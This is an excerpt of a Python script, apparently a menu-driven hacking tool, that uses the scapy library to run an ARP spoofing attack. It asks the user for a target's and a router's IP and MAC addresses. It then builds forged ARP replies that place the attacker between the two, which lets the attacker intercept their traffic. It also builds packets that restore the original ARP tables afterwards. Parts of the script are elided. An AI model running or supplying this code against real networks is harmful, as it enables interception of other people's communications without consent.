...
Your choice:  """)
                ...
                target_mac_address = str(input("Please enter the MAC Address of the target:  "))
                router_ip = str(input("Please enter the IP of the router:  "))
                router_mac_address = str(input("Please input the MAC Address of the router:  "))
                packet1 = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac_address, psrc=target_ip)
                packet2 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=router_ip)
    
                sent_packets_count = 0
                
                packet_restore = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=router_ip, hwsrc=router_mac_address)
                packet_restore2 = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac_address, psrc=target_ip, hwsrc=target_mac_address)
                ...
                try:
                    ...
                    scapy.send(packet_restore, count=4, verbose=False)
